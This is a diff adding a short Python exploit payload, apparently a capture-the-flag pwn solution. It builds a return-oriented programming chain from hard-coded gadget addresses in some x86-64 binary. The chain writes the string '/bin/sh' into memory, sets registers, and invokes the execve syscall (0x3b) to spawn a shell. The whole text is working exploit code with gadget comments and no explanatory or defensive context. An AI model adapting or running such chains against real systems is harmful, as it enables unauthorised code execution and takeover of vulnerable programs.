@@ -1,0 +1,21 @@
+payload = p64(0x409662)
+#0x0000000000409662: pop rsi; ret; 
+payload += p64(0x477048)+p64(0x42a4d7)
+# 0x000000000042a4d7: pop rax; ret; 
+payload += p64(0x68662f6e69622f)+p64(0x429677)
+# 0x0000000000429677: mov qword ptr [rsi + 0x28], rax; ret; 
+payload += p64(0x41bf60)
+# 0x000000000041bf60: xor edx, edx; mov eax, edx; pop rbx; ret; 
+payload += p64(0x0)+p64(0x409662)
+# 0x0000000000409662: pop rsi; ret; 
+payload += p64(0x0)+p64(0x43403b)
+# 0x000000000043403b: pop rcx; add rsp, 0xa0; pop rbx; ret; 
+payload += p64(0x42a4d7)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x42a4d7)
+# 0x000000000042a4d7: pop rax; ret; 
+payload += p64(0x477190)+p64(0x46ade8)
+# 0x000000000046ade8: pop rdi; add byte ptr [rax], al; fcomp st(1); cld; jmp rcx; 
+payload += p64(0x477070)
+# 0x000000000042a4d7: pop rax; ret; 
+payload += p64(0x3b)+p64(0x4342f0)
+# 0x00000000004342f0: syscall; 
+payload += b''
